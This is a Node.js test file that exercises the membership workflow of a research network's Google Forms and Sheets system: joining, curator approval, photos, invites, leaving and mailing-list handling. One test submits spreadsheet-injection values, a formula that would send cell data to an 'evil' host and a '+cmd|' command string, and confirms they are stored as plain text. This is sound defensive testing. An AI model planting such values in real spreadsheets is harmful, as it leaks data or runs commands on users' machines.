// Simulates every membership flow against an in-memory mock of Google's services.
// Run with: node apps-script/tests/flows.js
const assert = require('assert');
const {makeEnv} = require('./mock');
const E = makeEnv();
const {run, mails, priv, pub, fA, fB, files, Q, O} = E;
let ok = 0;
const check = (cond, msg) => { assert(cond, msg); ok++; console.log('  ✓ ' + msg); };
const members = () => priv.getSheetByName('Members').rowsAsObjects();
const publicRows = () => pub.getSheetByName('public').rowsAsObjects();
const summary = () => pub.getSheetByName('summary').rowsAsObjects();
const newMails = (() => { let seen = 0; return () => { const m = mails.slice(seen); seen = mails.length; return m; }; })();
const base = (o = {}) => Object.assign({
  [Q.NAME]: 'Alice Ashby', [Q.EMAIL]: 'Alice@Example.org', [Q.INSTITUTION]: 'UZH', [Q.CITY]: 'Zurich', [Q.COUNTRY]: 'Switzerland',
  [Q.WEBSITE]: 'orcid.org/0000-0001', [Q.INTERESTS]: 'Response diversity of plankton under heatwaves.',
  [Q.CAREER]: 'Postdoc', [Q.APPROACH]: ['Theory/modelling'], [Q.SYSTEMS]: ['Freshwater', 'Marine'],
  [Q.SHOW_ON_MAP]: O.YES, [Q.SHOW_FIELDS]: ['Name', 'Institution', 'Research attributes'],
  [Q.PRIVACY_OK]: [O.PRIVACY_OK],
}, o);
const submit = (key, r) => run(`handleSubmit_('${key}', __r)`.replace('__r', '__resp')) ;
E.ctx.__go = (key, resp) => E.ctx.handleSubmit_(key, resp);
const go = (key, resp) => E.ctx.__go(key, resp);
const photo = resp => E.ctx.onPhotoSubmit({response: resp});

console.log('1. New member (Form A) → pending');
run('installTriggers()');
check(E.triggers().length === 6, 'installTriggers creates 6 triggers (incl. the leave form)');
newMails();
let a = fA.submit(base());
go('A', a);
let m = members();
check(m.length === 1 && m[0].Approved === false, 'Members row created, not approved');
check(m[0].Email === 'alice@example.org', 'email lower-cased');
check(m[0].Country === 'Switzerland' && m[0]['Country code'] === 'CH' && m[0].Continent === 'Europe', 'geocoded with continent');
check(m[0]['Member ref'].length === 20 && /^m[0-9a-f]{8}$/.test(m[0]['Member ID']), 'member ref and public id assigned');
check(m[0]['Photo link'].includes(fB.id + '/prefill') && m[0]['Photo link'].includes(encodeURIComponent(m[0]['Member ref'])), 'Photo link column filled in for the curator');
let ms = newMails();
check(ms.length === 2 && ms[0].to === 'alice@example.org' && /membership received/.test(ms[0].subject), 'member gets "received" email');
check(ms[0].htmlBody.includes(a.getEditResponseUrl()), 'email contains personal edit link');
check(ms[0].htmlBody.includes(fB.id + '/prefill') && ms[0].htmlBody.includes(encodeURIComponent(m[0]['Member ref'])), 'email contains the photo-form link with the member ref');
check(ms[1].to === 'curator@example.org' && /New member to approve/.test(ms[1].subject), 'curator gets approval request');
check(publicRows().length === 0 && summary().find(r => r.metric === 'members').count === 0, 'not public before approval');
check(ms.every(x => !('replyTo' in x) && x.name === 'Response Diversity Network (membership)'), 'no reply-to on another domain; sender name set');
check(ms.every(x => !/\[Test\]/.test(x.subject)) && /test of the new RDN membership system/.test(ms[0].body), 'test phase: note in body, not in subject');

console.log('2. Curator approves');
const sh = priv.getSheetByName('Members');
sh.set(2, 1, true);
E.ctx.onSheetEdit({range: sh.getRange(2, 1), value: 'TRUE', oldValue: 'FALSE'});
ms = newMails();
check(ms.length === 1 && /membership confirmed/.test(ms[0].subject), 'member gets welcome email (listserv off → no manager email)');
let p = publicRows();
check(p.length === 1 && p[0].name === 'Alice Ashby' && p[0].email === '' && p[0].institution === 'UZH', 'public row shows only chosen fields');
check(p[0].lat === 47.38 && p[0].lon === 8.54, 'coordinates rounded to 2 decimals');
check(p[0].career_stage === 'Postdoc' && p[0].systems === 'Freshwater; Marine', 'attributes shown when consented');
check(p[0].website === '', 'website hidden (not ticked)');
check(p[0].id === m[0]['Member ID'] && !JSON.stringify(p).includes(m[0]['Member ref']), 'public id used; secret ref never public');
let s = summary();
check(s.find(r => r.metric === 'members').count === 1 && s.find(r => r.metric === 'continent').category === 'Europe', 'summary counts');
check(!s.some(r => r.metric === 'country'), 'country with <3 members not listed in summary');

console.log('3. Alice edits: new email, leaves mailing list, shows website');
fA.edit(a, {[Q.EMAIL]: 'alice@new.org', [Q.MAILING_OPT_OUT]: [O.MAILING_OPT_OUT], [Q.SHOW_FIELDS]: ['Name', 'Website or ORCID link', 'Research attributes']});
go('A', a);
m = members(); ms = newMails();
check(m.length === 1 && m[0].Email === 'alice@new.org' && m[0].Approved === true, 'same row updated, still approved');
check(ms.map(x => x.to).sort().join() === 'alice@example.org,alice@new.org', 'emails to new and old address');
check(publicRows()[0].website === 'https://orcid.org/0000-0001' && publicRows()[0].institution === '', 'website shown with https added; institution now hidden');

console.log('4. Alice adds a photo with the photo form');
let up = E.upload(true);
const ref = m[0]['Member ref'];
let b = fB.submit({[Q.MEMBER_REF]: ref, [Q.PHOTO]: [up]});
photo(b);
m = members(); ms = newMails();
check(m.length === 1 && m[0].Form === 'A' && m[0]['Response ID'] === a.getId(), 'entry and personal link unchanged');
check(m[0]['Photo URL'].startsWith('https://lh3.googleusercontent.com/d/') && m[0]['Photo pending'] === false, 'photo published');
check(publicRows()[0].photo_url === m[0]['Photo URL'], 'photo shown once uploaded (no separate tick needed)');
check(fB.getResponses().length === 0 && ms.length === 0, 'photo-form response not kept; no email needed');
fA.edit(a, {[Q.INTERESTS]: 'Plankton; heatwaves'}); go('A', a);
check(members()[0]['Photo URL'] === m[0]['Photo URL'] && publicRows()[0].photo_url === m[0]['Photo URL'], 'editing the membership form keeps the photo');
const up1b = E.upload(true);
photo(fB.submit({[Q.MEMBER_REF]: ref, [Q.PHOTO]: [up1b]}));
check(files[up].trashed === true && members()[0]['Photo uploads'] === up1b, 'a new photo replaces the old one');
up = up1b;

console.log('5. Alice removes her photo');
photo(fB.submit({[Q.MEMBER_REF]: ref, [Q.REMOVE_PHOTO]: [O.REMOVE_PHOTO]}));
m = members();
check(m[0]['Photo URL'] === '' && m[0]['Photo uploads'] === '', 'photo fields cleared');
check(files[up].trashed === true, 'original upload trashed');
check(Object.values(files).filter(f => f.folder === 'photos' && !f.trashed).length === 0, 'public photo copy trashed');
check(publicRows()[0].photo_url === '', 'no photo in public data');
const upX = E.upload(true);
photo(fB.submit({[Q.MEMBER_REF]: 'not-a-real-ref', [Q.PHOTO]: [upX]}));
ms = newMails();
check(files[upX].trashed === true && ms.some(x => x.to === 'curator@example.org' && /unknown member reference/.test(x.subject)), 'photo with an unknown reference discarded, curator told');

console.log('6. Invited existing member responds → approved immediately');
const inv = priv.insertSheet('Invites');
inv.appendRow(['Name', 'Organisation', 'Country', 'City', 'State/Province', 'Email', 'Status', 'Comments', 'Date joined']);
inv.appendRow(['Bob Brenner', 'Harvard', 'USA', 'Cambridge', 'Massachusetts', 'bob@example.org', 'active', '', '2021-05-01']);
run('prepareInvites()');
const bobRef = inv.rowsAsObjects()[0]['Member ref'];
let bobR = fA.submit(base({[Q.NAME]: 'Bob Brenner', [Q.EMAIL]: 'bob@example.org', [Q.INSTITUTION]: 'Harvard', [Q.CITY]: 'Cambridge',
  [Q.STATE]: 'Massachusetts', [Q.COUNTRY]: 'USA', [Q.MEMBER_REF]: bobRef, [Q.CAREER]: 'Mid/senior researcher'}));
go('A', bobR);
m = members(); ms = newMails();
const bob = m.find(r => r.Name === 'Bob Brenner');
check(bob.Approved === true && bob['Member ref'] === bobRef && bob.Joined === '2021-05-01', 'approved, keeps invite ref and join date');
check(bob.Country === 'United States' && bob.Continent === 'North America', 'state used for geocoding; country normalised');
check(inv.rowsAsObjects()[0]['Invite state'] === 'responded', 'invite marked responded');
check(ms.length === 1 && /membership details saved/.test(ms[0].subject), 'welcome email only, no curator email');
check(publicRows().length === 2, 'Bob on the map');

console.log('7. Formula injection and failed geocoding');
let c = fA.submit(base({[Q.NAME]: '=IMAGE("https://evil/"&B2)', [Q.EMAIL]: 'carol@example.org', [Q.CITY]: 'Atlantis', [Q.COUNTRY]: 'Ocean',
  [Q.INTERESTS]: '+cmd|stuff and more text to pass thirty chars'}));
go('A', c);
m = members(); ms = newMails();
const carol = m.find(r => r.Email === 'carol@example.org');
check(typeof carol.Name === 'string' && carol.Name.startsWith('=IMAGE'), 'formula stored as text, not executed');
check(/Could not find/.test(carol.Notes) && carol.Lat === '', 'geocoding failure noted');
check(ms.some(x => x.to === 'curator@example.org' && /Could not find/.test(x.htmlBody)), 'curator told about the location problem');
sh.set(carol.__row || m.indexOf(carol) + 2, 1, true);
E.ctx.onSheetEdit({range: sh.getRange(m.indexOf(carol) + 2, 1), value: 'TRUE', oldValue: 'FALSE'});
check(publicRows().length === 2, 'approved member without coordinates is not on the map');
check(summary().find(r => r.metric === 'members').count === 3, '...but is counted in the summary');
// curator fixes the city
sh.set(m.indexOf(carol) + 2, 6, 'Bern'); sh.set(m.indexOf(carol) + 2, 8, 'Switzerland');
E.ctx.onSheetEdit({range: sh.getRange(m.indexOf(carol) + 2, 6, 1, 3)});
check(publicRows().length === 3, 'after the curator corrects the city, the member appears');
const pubCarol = pub.getSheetByName('public').data.find(r => r && r[0] === carol['Member ID']);
check(typeof pubCarol[1] === 'string', 'formula-like name is plain text in the public sheet too');
newMails();

console.log('8. Leaving');
fA.edit(bobR, {[Q.LEAVE]: [O.LEAVE]});
go('A', bobR);
m = members(); ms = newMails();
check(!m.some(r => r.Name === 'Bob Brenner'), 'Members row deleted');
check(!fA.getResponses().some(r => r.id === bobR.id) && !fA.tab.data.some(r => r && r.includes('bob@example.org')), 'response and sheet row deleted');
check(inv.rowsAsObjects()[0]['Invite state'] === 'left', 'invite marked left');
check(ms.length === 1 && /you have left/.test(ms[0].subject) && ms[0].to === 'bob@example.org', 'leave confirmation');
check(!publicRows().some(r => r.name === 'Bob Brenner'), 'removed from map');
// leave ticked on a brand-new submission
let x = fA.submit(base({[Q.EMAIL]: 'x@example.org', [Q.LEAVE]: [O.LEAVE]}));
go('A', x);
check(!fA.getResponses().some(r => r.id === x.id) && !members().some(r => r.Email === 'x@example.org'), 'leave on a new submission stores nothing');
check(newMails().length === 0, '...and, for an unknown email, sends no email at all');
newMails();

console.log('9. Photo not ready at submit → retried');
const up2 = E.upload(false);
let d = fA.submit(base({[Q.NAME]: 'Dan Dorval', [Q.EMAIL]: 'dan@example.org', [Q.CITY]: 'Nairobi', [Q.COUNTRY]: 'Kenya', [Q.SHOW_FIELDS]: ['Name']}));
go('A', d);
photo(fB.submit({[Q.MEMBER_REF]: members().find(r => r.Email === 'dan@example.org')['Member ref'], [Q.PHOTO]: [up2]}));
let dan = members().find(r => r.Email === 'dan@example.org');
check(dan['Photo pending'] === true && dan['Photo URL'] === '', 'photo marked pending');
files[up2].thumbReady = true;
run('maintenanceTick()');
dan = members().find(r => r.Email === 'dan@example.org');
check(dan['Photo pending'] === false && dan['Photo URL'].startsWith('https://lh3'), 'retry publishes photo');
newMails();

console.log('10. Mailing list');
run('CONFIG.LISTSERV_NOTIFY_EACH = true');
const danRow = members().findIndex(r => r.Email === 'dan@example.org') + 2;
sh.set(danRow, 1, true);
E.ctx.onSheetEdit({range: sh.getRange(danRow, 1), value: 'TRUE', oldValue: 'FALSE'});
ms = newMails();
check(ms.some(x => /Please subscribe/.test(x.subject) && x.to === 'owen.petchey@uzh.ch'), 'manager asked to subscribe on approval');
fA.edit(d, {[Q.MAILING_OPT_OUT]: [O.MAILING_OPT_OUT]}); go('A', d);
check(members().find(r => r.Email === 'dan@example.org')['Mailing list'] === 'No', 'opt-out box gives No');
check(newMails().some(x => /Please unsubscribe/.test(x.subject)), 'manager asked to unsubscribe on opt-out');
run('emailMailingListRequests()');
ms = newMails();
check(ms.length === 1 && /members to subscribe/.test(ms[0].subject) && ms[0].body.includes('Carol') === false, 'bulk list email sent');

check(run(`mailingListAnswer_({'${Q.MAILING_LIST}': 'No'})`) === 'No' && run('mailingListAnswer_({})') === 'Yes', 'old opt-in answers still read; no tick = on the list');

console.log('10b. Old-list member joins via the join page; invite links export');
inv.appendRow(['Erin Eklund', 'Uppsala University', 'Sweden', 'Uppsala', '', 'erin@example.org', 'active', '', '2019-02-02']);
run('prepareInvites()');
newMails();
const erinRef = inv.rowsAsObjects().find(r => r.Name === 'Erin Eklund')['Member ref'];
let erinJ = fA.submit(base({[Q.NAME]: 'Erin Eklund', [Q.EMAIL]: 'Erin@Example.org', [Q.CITY]: 'Zurich', [Q.COUNTRY]: 'Switzerland'}));
go('A', erinJ);
let erin = members().find(r => r.Email === 'erin@example.org');
ms = newMails();
check(erin.Approved === false && erin.Joined === '2019-02-02' && erin['Member ref'] === erinRef, 'matched by email: keeps join date and invite ref, still needs approval');
check(ms.some(x => x.to === 'curator@example.org' && /old member list/.test(x.htmlBody)), 'curator told it matches the old list');
check(inv.rowsAsObjects().find(r => r.Name === 'Erin Eklund')['Invite state'] === 'responded', 'no reminder will be sent');
newMails();
let erinI = fA.submit(base({[Q.NAME]: 'Erin Eklund', [Q.EMAIL]: 'erin@example.org', [Q.CITY]: 'Zurich', [Q.COUNTRY]: 'Switzerland', [Q.MEMBER_REF]: erinRef}));
go('A', erinI);
check(newMails().some(x => /personal link has changed/.test(x.body)), 'member told their personal link has changed');
check(members().filter(r => r.Email === 'erin@example.org').length === 1 && !fA.getResponses().some(r => r.id === erinJ.id), 'later reply via the invitation updates the same entry');
run("CONFIG.TEST_PHASE = false");
inv.appendRow(['Finn Faro', 'Lisbon Uni', 'Portugal', 'Lisbon', '', 'finn@example.org', 'active', '', '2018-01-01']);
run('prepareInvites(); exportInviteLinks()');
const links = priv.getSheetByName('Invite links').rowsAsObjects();
check(links.length === 1 && links[0].Email === 'finn@example.org' && links[0].FirstName === 'Finn' && links[0].Link.includes(fA.id + '/prefill') && !('LinkWithPhoto' in links[0]), 'export lists only members who have not responded, with their links');
newMails();
run('sendTestInvite()');
ms = newMails();
check(ms.length === 1 && ms[0].to === 'owen.petchey@uzh.ch' && !('replyTo' in ms[0]) && /rdn.projectbase@gmail.com to your contacts/.test(ms[0].body), 'test invitation to the system administrator; asks to add sender to contacts');
newMails();

console.log('10c. Leave form with curator confirmation');
const LQ = run('LQ'), LOPT = run('LEAVE_CONFIRM_OPTION'), fL = E.fL;
newMails();
const danBefore = members().find(r => r.Email === 'dan@example.org');
let lr = fL.submit({[LQ.EMAIL]: ' DAN@example.org ', [LQ.CONFIRM]: [LOPT], [LQ.MESSAGE]: 'Moving on, thanks!'});
E.ctx.onLeaveRequest({response: lr});
const leaveSh = priv.getSheetByName('Leave requests');
let reqs = leaveSh.rowsAsObjects();
ms = newMails();
check(reqs.length === 1 && reqs[0].Email === 'dan@example.org' && reqs[0]['Member ID'] === danBefore['Member ID'] && reqs[0].Confirmed === false, 'request queued and matched to the member');
check(members().some(r => r.Email === 'dan@example.org') && fL.getResponses().length === 0, 'nothing deleted yet; leave-form response not kept');
check(ms.some(x => x.to === 'dan@example.org' && /request to leave received/.test(x.subject)) && ms.some(x => x.to === 'curator@example.org' && /Request to leave/.test(x.subject)), 'member acknowledged, curator asked to confirm');
const danPhoto = danBefore['Photo URL'];
leaveSh.set(2, 1, true);
E.ctx.onSheetEdit({range: leaveSh.getRange(2, 1), value: 'TRUE', oldValue: 'FALSE'});
reqs = leaveSh.rowsAsObjects(); ms = newMails();
check(!members().some(r => r.Email === 'dan@example.org') && /^Done: entry deleted/.test(reqs[0].Status), 'after confirmation: member deleted, status done');
check(!publicRows().some(r => r.name === 'Dan Dorval') && Object.values(files).filter(f => f.folder === 'photos' && !f.trashed).length === 0, 'removed from map; public photo trashed');
check(ms.some(x => x.to === 'dan@example.org' && /you have left/.test(x.subject)), 'leave confirmation email');
E.ctx.onSheetEdit({range: leaveSh.getRange(2, 1), value: 'TRUE', oldValue: 'TRUE'});
check(newMails().length === 0, 're-ticking a done request does nothing');
lr = fL.submit({[LQ.EMAIL]: 'stranger@example.org', [LQ.CONFIRM]: [LOPT]});
E.ctx.onLeaveRequest({response: lr});
ms = newMails();
check(ms.length === 1 && ms[0].to === 'curator@example.org' && /No member/.test(ms[0].htmlBody), 'unknown address: curator told, no email to the stranger');
lr = fL.submit({[LQ.EMAIL]: 'finn@example.org', [LQ.CONFIRM]: [LOPT]});
E.ctx.onLeaveRequest({response: lr});
leaveSh.set(4, 1, true);
E.ctx.onSheetEdit({range: leaveSh.getRange(4, 1)});
check(inv.rowsAsObjects().find(r => r.Name === 'Finn Faro')['Invite state'] === 'removed' && /old member list/.test(leaveSh.rowsAsObjects()[2].Status), 'old-list-only person removed from invitations');
newMails();
// A fresh form with "Leave" ticked and a member's email: becomes a request, nothing deleted.
const erinNow = members().find(r => r.Email === 'erin@example.org');
let fresh = fA.submit(base({[Q.NAME]: 'Someone Else', [Q.EMAIL]: 'erin@example.org', [Q.LEAVE]: [O.LEAVE]}));
go('A', fresh);
const lastReq = leaveSh.rowsAsObjects().slice(-1)[0];
ms = newMails();
check(members().some(r => r['Member ID'] === erinNow['Member ID']) && !fA.getResponses().some(r => r.id === fresh.id), 'fresh-form leave: member kept, submission discarded');
check(lastReq.Email === 'erin@example.org' && lastReq['Member ID'] === erinNow['Member ID'] && /new form/.test(lastReq.Message), 'fresh-form leave queued as a leave request');
check(ms.some(x => x.to === 'erin@example.org' && /request to leave received/.test(x.subject)) && !ms.some(x => /you have left/.test(x.subject)), 'member asked to object; no "you have left" email');

console.log('11. Clearing test data');
assert.throws(() => run('clearTestData()'), /Safety catch/); ok++; console.log('  ✓ safety catch blocks clearTestData');
run('ALLOW_CLEAR = true');
run('clearTestData()');
check(members().length === 0 && fA.getResponses().length === 0 && fB.getResponses().length === 0, 'everything cleared');
check(priv.getSheetByName('Leave requests').getLastRow() === 1, 'leave requests cleared');
check(fA.tab.getLastRow() === 1, 'response tab keeps only its header');
check(Object.values(files).every(f => f.trashed), 'all uploads and public photos trashed');
check(publicRows().length === 0 && summary().find(r => r.metric === 'members').count === 0, 'public sheet empty');

console.log('12. Renaming the response tab');
run('renameResponsesTab()');
const propsNow = () => E.ctx.PropertiesService.getScriptProperties().getProperty('RESPONSES_A_TAB');
check(fA.tab.name === 'Form responses' && propsNow() === 'Form responses', 'tab renamed and the script property follows');
run('renameResponsesTab()');
check(propsNow() === 'Form responses', 'running it again is harmless');
let g = fA.submit(base({[Q.NAME]: 'Gina Gale', [Q.EMAIL]: 'gina@example.org'}));
go('A', g);
const rowsBefore = fA.tab.getLastRow();
run(`deleteResponse_('A', '${g.id}', ['gina@example.org'])`);
check(rowsBefore > 1 && fA.tab.getLastRow() === rowsBefore - 1, 'deleting a response still removes its row from the renamed tab');

console.log('13. Submissions the automation missed');
newMails();
let h = fA.submit(base({[Q.NAME]: 'Hugo Hale', [Q.EMAIL]: 'hugo@example.org'}));   // no trigger ran
run('processMissedResponses()');
ms = newMails();
check(members().some(r => r.Email === 'hugo@example.org') && ms.some(x => x.to === 'hugo@example.org'), 'missed new submission handled and emailed');
const nMembers = members().length;
run('processMissedResponses()');
check(members().length === nMembers && newMails().length === 0, 'running it again does nothing');
fA.edit(h, {[Q.INSTITUTION]: 'ETH'});   // a missed edit
run('processMissedResponses()');
check(members().find(r => r.Email === 'hugo@example.org').Institution === 'ETH', 'missed edit handled');

console.log('14. Diagnose');
E.log.length = 0;
run('diagnose()');
check(E.log.some(l => /hugo@example.org \| ref .* \| in Members/.test(l)) && E.log.some(l => /^Triggers: .*onSubmitA/.test(l)), 'diagnose lists responses and triggers');

console.log(`\nAll ${ok} checks passed.`);
